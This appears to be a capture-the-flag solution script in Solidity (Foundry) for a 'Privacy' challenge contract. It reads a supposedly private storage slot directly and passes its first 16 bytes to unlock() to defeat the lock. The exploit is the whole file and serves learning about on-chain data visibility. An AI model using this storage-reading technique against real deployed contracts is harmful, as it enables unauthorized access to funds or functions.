// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacySolve is Script{
    Privacy public privacy = Privacy(0x97Fd86fBE6F968de018C7C15B9D2f2cb2Caa94b2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot5 = vm.load(address(privacy), bytes32(uint256(5)));
        console.logBytes32(slot5);

        console.log("Locked : ", privacy.locked());


        privacy.unlock(bytes16(slot5));

        console.log("Locked : ", privacy.locked());

        vm.stopBroadcast();
    }
}